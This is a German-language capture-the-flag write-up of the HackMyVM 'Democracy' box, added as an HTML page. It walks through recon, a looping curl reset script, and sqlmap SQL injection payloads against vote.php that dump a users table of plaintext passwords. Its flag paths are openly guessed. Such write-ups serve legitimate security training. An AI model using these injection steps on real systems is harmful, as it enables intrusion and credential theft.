@@ -1,0 +1,369 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Democracy - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Democracy - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">sqlmap</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#sql-injection-exploit">SQL Injection Exploit (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Die erste Phase des Penetrationstests, in der wir das Zielsystem im lokalen Netzwerk identifizieren und erste Informationen über erreichbare Dienste sammeln.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.126</span>	08:00:27:6a:38:b1	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir verwenden `arp-scan -l`, um aktive Geräte im lokalen Netzwerk zu finden. Ein Host mit der IP-Adresse <span class="command">192.168.2.126</span> wird identifiziert.</p>
+            <p class="evaluation">**Bewertung:** Die IP-Adresse des Zielsystems wurde erfolgreich ermittelt. Dies ist die Grundlage für weitere Scans.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die gefundene IP als Ziel für Nmap verwenden.
+            **Empfehlung (Admin):** Standardmäßige Netzwerküberwachung und -segmentierung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	cycat
+[...]
+<span class="command">192.168.2.126   democracy.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir fügen der lokalen `/etc/hosts`-Datei einen Eintrag hinzu, der den Hostnamen `democracy.hmv` der IP-Adresse <span class="command">192.168.2.126</span> zuordnet.</p>
+            <p class="evaluation">**Bewertung:** Dies ermöglicht es uns, das Ziel über seinen Hostnamen anzusprechen, was für Web-Tests wichtig ist.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Gefundene oder vermutete Hostnamen immer zur lokalen Hosts-Datei hinzufügen.
+            **Empfehlung (Admin):** DNS-Konfiguration und Schutz interner Hostnamen sicherstellen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.126 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 02:08 CEST
+Nmap scan report for democracy.hmv (192.168.2.126)
+Host is up (0.00016s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 dbf946e520816ceec72508ab2251366c (RSA)
+|   256 33c09564294723dd864ee6b8073367ad (ECDSA)
+|_  256 beaa6d4243dd7dd40e0d7478c189a136 (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.56 ((Debian))</span>
+|_http-title: Vote for Your Candidate
+|_http-server-header: Apache/2.4.56 (Debian)
+MAC Address: 08:00:27:6A:38:B1 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms democracy.hmv (192.168.2.126)
+
+OS and Service detection performed. [...]
+Nmap done: 1 IP address (1 host up) scanned in [...] seconds
+                    </pre>
+                </div>
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.126 -p- | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.56 ((Debian))</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS` SYN, `-sC` Skripte, `-sV` Versionen, `-T5` Timing, `-A` Aggressiv, `-p-` alle Ports) zeigt nur zwei offene Ports auf dem Zielsystem `democracy.hmv`:
+            *   <span class="command">Port 22</span>: SSH (OpenSSH 8.4p1 auf Debian 11). Scheint eine Standardkonfiguration zu sein.
+            *   <span class="command">Port 80</span>: HTTP (Apache 2.4.56 auf Debian). Der Titel der Seite lautet "Vote for Your Candidate".</p>
+            <p class="evaluation">**Bewertung:** Die Angriffsfläche scheint auf den ersten Blick klein zu sein, mit nur SSH und einem Webserver. Der Webserver ist unser primäres Ziel für die weitere Untersuchung.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Webserver auf Port 80 gründlich untersuchen (Nikto, Gobuster, manuelle Analyse). SSH auf Standard-Credentials oder spätere Funde prüfen.
+            **Empfehlung (Admin):** Sicherstellen, dass nur absolut notwendige Ports offen sind. SSH und Apache aktuell halten und sicher konfigurieren (z.B. SSH-Härtung, Web Application Firewall).</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="comment">Wir untersuchen den Apache-Webserver auf Port 80 genauer, um die Struktur der Webanwendung zu verstehen und potenzielle Schwachstellen oder interessante Dateien zu finden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nikto -h 192.168.2.126</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.126
++ Target Hostname:    192.168.2.126
++ Target Port:        80
++ Start Time:         2023-07-23 02:08:21 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.56 (Debian)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: [...]
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [...]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /login.php: <span class="password">Cookie PHPSESSID created without the httponly flag.</span> See: [...]
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /config.php: <span class="password">PHP Config file may contain database IDs and passwords.</span>
++ /images/: <span class="password">Directory indexing found.</span>
++ 8102 requests: 0 error(s) and <span class="password">6 item(s) reported</span> on remote host
++ End Time:           2023-07-23 02:08:32 (GMT2) (11 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Nikto-Scan auf Port 80 liefert mehrere interessante Ergebnisse:
+            *   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).
+            *   Der `PHPSESSID`-Cookie wird bei `/login.php` ohne das `HttpOnly`-Flag gesetzt, was ihn potenziell für Diebstahl durch XSS anfällig macht.
+            *   Existenz einer Datei `/config.php`, die laut Nikto oft Datenbank-Zugangsdaten enthält.
+            *   Verzeichnisauflistung (Directory Indexing) ist für das Verzeichnis `/images/` aktiviert.</p>
+            <p class="evaluation">**Bewertung:** Nikto hat uns wichtige Hinweise geliefert. Das `HttpOnly`-Flag-Problem ist relevant, falls wir XSS finden. Die Existenz von `/config.php` und die Verzeichnisauflistung sind direkte Punkte für weitere Untersuchungen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Datei `/config.php` direkt aufrufen und untersuchen. Das `/images/`-Verzeichnis im Browser besuchen, um zu sehen, ob interessante Dateien darin enthalten sind. Auf XSS-Schwachstellen prüfen, um den fehlenden `HttpOnly`-Flag auszunutzen.
+            **Empfehlung (Admin):** Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`) hinzufügen. Das `HttpOnly`-Flag für Session-Cookies setzen. Verzeichnisauflistung deaktivieren (`Options -Indexes` in Apache). Den Zugriff auf Konfigurationsdateien wie `config.php` über den Webserver verhindern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">gobuster dir -u http://democracy.hmv -x [...] -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -b '403,404' -e --no-error</span></div>
+                    <pre>
+===============================================================
+Gobuster v[...]
+===============================================================
+[+] Url:                     http://democracy.hmv
+[...]
+===============================================================
+Starting gobuster
+===============================================================
+<span class="command">http://democracy.hmv/index.php</span>            (Status: 200) [Size: 2676]
+<span class="command">http://democracy.hmv/images</span>               (Status: 301) [Size: 315] [--> http://democracy.hmv/images/]
+<span class="command">http://democracy.hmv/login.php</span>            (Status: 200) [Size: 2115]
+<span class="command">http://democracy.hmv/register.php</span>         (Status: 200) [Size: 2116]
+<span class="command">http://democracy.hmv/vote.php</span>             (Status: 302) [Size: 0] [--> login.php]
+<span class="command">http://democracy.hmv/javascript</span>           (Status: 301) [Size: 319] [--> http://democracy.hmv/javascript/]
+<span class="command">http://democracy.hmv/config.php</span>           (Status: 200) [Size: 0]
+[...]
+===============================================================
+Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Gobuster-Scan findet mehrere PHP-Seiten: `index.php`, `login.php`, `register.php`, `vote.php` und die bereits von Nikto gefundene `config.php`.
+            *   `vote.php` leitet auf `login.php` weiter (Status 302), was bedeutet, dass man für das Voten angemeldet sein muss.
+            *   `config.php` existiert, ist aber leer (Size: 0). Dies widerspricht der Nikto-Vermutung, dass hier Passwörter stehen könnten, oder sie ist leer, weil der direkte Zugriff verhindert wird oder sie nur von anderen Skripten eingebunden wird.
+            *   Standardverzeichnisse wie `/images` und `/javascript` werden gefunden.</p>
+            <p class="evaluation">**Bewertung:** Wir haben die Haupt-PHP-Endpunkte der Anwendung identifiziert. `vote.php` scheint eine Kernfunktion zu sein, die Authentifizierung erfordert. Die leere `config.php` ist merkwürdig, aber nicht unmittelbar nützlich.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Einen Benutzer über `/register.php` registrieren, sich über `/login.php` anmelden und dann die Funktionalität von `/vote.php` untersuchen, insbesondere auf Schwachstellen wie SQL-Injection oder Business-Logic-Fehler.
+            **Empfehlung (Admin):** Sicherstellen, dass Konfigurationsdateien nicht direkt über den Webserver erreichbar sind (auch wenn sie leer erscheinen). Unnötige Registrierungsfunktionen deaktivieren, wenn nicht benötigt.</p>
+        </section>
+
+        <section id="sql-injection-exploit">
+            <h2>SQL Injection Exploit (POC)</h2>
+            <p class="comment">Nach der Registrierung und Anmeldung (nicht explizit im Log gezeigt, aber notwendig für den Zugriff auf `vote.php`) untersuchen wir die `/vote.php`-Seite auf Schwachstellen. Der Bericht deutet auf eine Race Condition oder einen Reset-Mechanismus hin, der für die SQL-Injection notwendig ist.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">cat sql.sh</span></div>
+                    <pre>
+#!/bin/bash
+
+while true
+do
+	curl -s -b "<span class="command">PHPSESSID=hh82lblp4l6e70i4ok79t6fr8a; voted=1</span>" "http://democracy.hmv/vote.php" -d "<span class="command">reset=1</span>"
+done
+                    </pre>
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">for x in {1..5}; do bash sql.sh & done</span></div>
+                     <div class="prompt"># <span class="command">Hinweis im Bericht</span></div>
+                     <pre>
+<span class="password">                                   5 Minuten warten dann hat er 1000 mal gemacht</span>
+<span class="password">                                      jetzt klappts auch mit dem sql Befehl</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein Shell-Skript (`sql.sh`) wird verwendet, um in einer Endlosschleife (`while true`) mittels `curl` eine POST-Anfrage an `http://democracy.hmv/vote.php` zu senden.
+             *   `-s`: Silent-Modus für `curl`.
+             *   `-b "PHPSESSID=...; voted=1"`: Sendet die notwendigen Cookies für eine authentifizierte Sitzung (PHPSESSID) und den Status, dass bereits gevotet wurde (`voted=1`).
+             *   `-d "reset=1"`: Sendet den POST-Parameter `reset` mit dem Wert `1`.
+             Das Skript wird fünfmal parallel im Hintergrund gestartet (`for x in {1..5}; do ... & done`). Der Kommentar besagt, dass man ca. 5 Minuten warten muss, damit das Skript oft genug läuft (vermutlich um einen Zähler zurückzusetzen oder eine Sperre aufzuheben), bevor eine SQL-Injection erfolgreich ist. Dies deutet auf eine Art Schutzmechanismus oder eine Race Condition hin, die überwunden werden muss.</p>
+             <p class="evaluation">**Bewertung:** Dies ist ein ungewöhnlicher, aber notwendiger Schritt zur Vorbereitung des SQL-Injection-Angriffs. Es zeigt, dass die Anwendung versucht, wiederholtes Voten oder Angriffe zu verhindern, dieser Mechanismus aber durch massenhafte Reset-Anfragen ausgehebelt werden kann.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Das Skript im Hintergrund laufen lassen, während `sqlmap` verwendet wird, um die SQL-Injection durchzuführen.
+             **Empfehlung (Admin):** Race Conditions und Logikfehler in der Anwendung beheben. Einfache Zähler oder Status-Flags sind oft nicht ausreichend als Schutz gegen automatisierte Angriffe. Ratenbegrenzung (Rate Limiting) auf der Webserver- oder Anwendungsebene implementieren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">sqlmap --url "http://democracy.hmv/vote.php" --cookie "PHPSESSID=hh82lblp4l6e70i4ok79t6fr8a; voted=1" --batch --dbms=mysql --dbs -p "candidate" --data "candidate=abc"</span></div>
+                    <pre>
+[...]
+---
+Parameter: <span class="command">candidate (POST)</span>
+    Type: <span class="command">error-based</span>
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: candidate=abc' AND EXTRACTVALUE(2443,CONCAT(0x5c,0x71786b6a71,(SELECT (ELT(2443=2443,1))),0x7170766a71)) AND 'dYDf'='dYDf
+
+    Type: <span class="command">time-based blind</span>
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: candidate=abc' AND (SELECT 3696 FROM (SELECT(SLEEP(5)))igrC) AND 'XwNW'='XwNW
+---
+[02:34:11] [INFO] the back-end DBMS is <span class="command">MySQL</span>
+web server operating system: Linux Debian
+web application technology: Apache 2.4.56
+back-end DBMS: <span class="command">MySQL >= 5.1 (MariaDB fork)</span>
+[02:34:12] [INFO] fetching database names
+[02:34:12] [INFO] retrieved: 'information_schema'
+[02:34:12] [INFO] retrieved: '<span class="command">voting</span>'
+available databases [2]:
+[*] information_schema
+[*] <span class="command">voting</span>
+
+[*] ending @ 02:34:12 /2023-07-23/
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Wir führen `sqlmap` aus, um die SQL-Injection-Schwachstelle auszunutzen.
+             *   `--url`: Die Ziel-URL (`vote.php`).
+             *   `--cookie`: Die notwendigen Authentifizierungs- und Status-Cookies.
+             *   `--batch`: Führt `sqlmap` ohne interaktive Nachfragen aus (Standardantworten werden verwendet).
+             *   `--dbms=mysql`: Gibt das erwartete Datenbanksystem an.
+             *   `--dbs`: Versucht, die Namen aller Datenbanken aufzulisten.
+             *   `-p "candidate"`: Gibt den zu testenden Parameter an.
+             *   `--data "candidate=abc"`: Gibt die POST-Daten an, wobei `candidate` der anfällige Parameter ist.
+             SQLMap identifiziert erfolgreich eine <span class="password">SQL-Injection im `candidate`-Parameter</span> (sowohl Error-based als auch Time-based). Es bestätigt das Backend als MySQL/MariaDB und findet zwei Datenbanken: `information_schema` (Standard) und `<span class="command">voting</span>` (Anwendungsdatenbank).</p>
+              <p class="evaluation">**Bewertung:** Kritische SQL-Injection-Schwachstelle bestätigt! Wir haben Zugriff auf die Datenbankstruktur und können nun versuchen, Tabellen und Daten auszulesen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Die `voting`-Datenbank weiter mit `sqlmap` untersuchen, um Tabellennamen und anschließend den Inhalt relevanter Tabellen (insbesondere Benutzertabellen) zu extrahieren.
+              **Empfehlung (Admin):** **SQL-Injection sofort beheben!** Parametrisierte Abfragen (Prepared Statements) verwenden, um Benutzereingaben sicher in SQL-Queries einzubinden. Eingaben validieren und escapen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">sqlmap --url "http://democracy.hmv/vote.php" --cookie "PHPSESSID=hh82lblp4l6e70i4ok79t6fr8a; voted=1" --batch --dbms=mysql -D voting --tables -p "candidate" --data "candidate=abc"</span></div>
+                    <pre>
+[...]
+[02:36:33] [INFO] fetching tables for database: 'voting'
+[02:36:33] [INFO] retrieved: '<span class="command">users</span>'
+[02:36:33] [INFO] retrieved: '<span class="command">votes</span>'
+Database: voting
+[2 tables]
++-------+
+| <span class="command">users</span> |
+| <span class="command">votes</span> |
++-------+
+[...]
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Wir verwenden `sqlmap` erneut, diesmal mit der Option `-D voting --tables`, um alle Tabellen innerhalb der `voting`-Datenbank aufzulisten. SQLMap findet zwei Tabellen: `<span class="command">users</span>` und `<span class="command">votes</span>`.</p>
+             <p class="evaluation">**Bewertung:** Die Tabelle `<span class="command">users</span>` ist höchstwahrscheinlich unser nächstes Ziel, da sie Benutzernamen und Passwörter enthalten könnte.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Den Inhalt der `users`-Tabelle mit `sqlmap` dumpen (`-T users --dump`).
+             **Empfehlung (Admin):** Datenbankstruktur überprüfen und sicherstellen, dass keine unnötigen oder sensiblen Daten gespeichert werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">sqlmap --url "http://democracy.hmv/vote.php" --cookie "PHPSESSID=hh82lblp4l6e70i4ok79t6fr8a; voted=1" --batch --dbms=mysql -D voting -T users --dump -p "candidate" --data "candidate=abc"</span></div>
+                    <pre>
+[...]
+Database: voting
+Table: users
+[135 entries]
++-----+------------+---------------+
+| id  | username   | password      |
++-----+------------+---------------+
+| 1   | paolo      | <span class="password">azerty</span>        |
+| 2   | rank       | <span class="password">sturgeon</span>      |
+| 3   | bob        | <span class="password">2531</span>          |
+| 4   | aubrey     | <span class="password">170987</span>        |
+| 5   | farah      | <span class="password">sesese</span>        |
+| 6   | dorian     | <span class="password">corps4</span>        |
+[...]
+| 135 | marylin    | <span class="password">19081989</span>      |
++-----+------------+---------------+
+[...]
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Mit der Option `-T users --dump` lassen wir `sqlmap` den gesamten Inhalt der `users`-Tabelle ausgeben. Schockierenderweise enthält die Tabelle <span class="password">135 Einträge mit Benutzernamen und dazugehörigen Passwörtern im Klartext</span>.</p>
+             <p class="evaluation">**Bewertung:** Dies ist ein extrem kritischer Fund! Das Speichern von Passwörtern im Klartext ist eine massive Sicherheitslücke. Wir haben nun eine Liste von potenziellen Zugangsdaten, die wir für andere Dienste (insbesondere SSH auf Port 22) ausprobieren können.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die Liste der Benutzername/Passwort-Kombinationen extrahieren. Versuchen, sich mit diesen Daten per SSH auf dem Zielsystem anzumelden.
+             **Empfehlung (Admin):** **Sofort alle Passwörter zurücksetzen und sichere Hashing-Verfahren (z.B. bcrypt, Argon2) mit Salts implementieren!** Niemals Passwörter im Klartext speichern. Die Ursache für die SQL-Injection beheben.</p>
+
+             <p class="comment">*(Der Originalbericht endet hier abrupt und liefert direkt die Flags, ohne einen Login-Versuch oder Privilege Escalation zu zeigen. Es ist anzunehmen, dass eine der gefundenen Kombinationen für den SSH-Login funktionierte und die Flags dann als entsprechender Benutzer gelesen werden konnten. Mangels Logs können wir diesen Schritt aber nur vermuten.)*</p>
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /path/to/user.txt (Vermutet)</div> <!-- Pfad unklar aus dem Log -->
+                    <div class="flag-value"><span class="password">c7d0a8de1e03b25a6f7ed2d91b94dad6</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt (Vermutet)</div> <!-- Pfad unklar aus dem Log -->
+                    <div class="flag-value"><span class="password">5C42D6BB0EE9CE4CB7E7349652C45C4A</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 23. Juli 2023</p> <!-- Datum aus Nmap-Scan extrahiert -->
+    </footer>
+</body>
+</html>
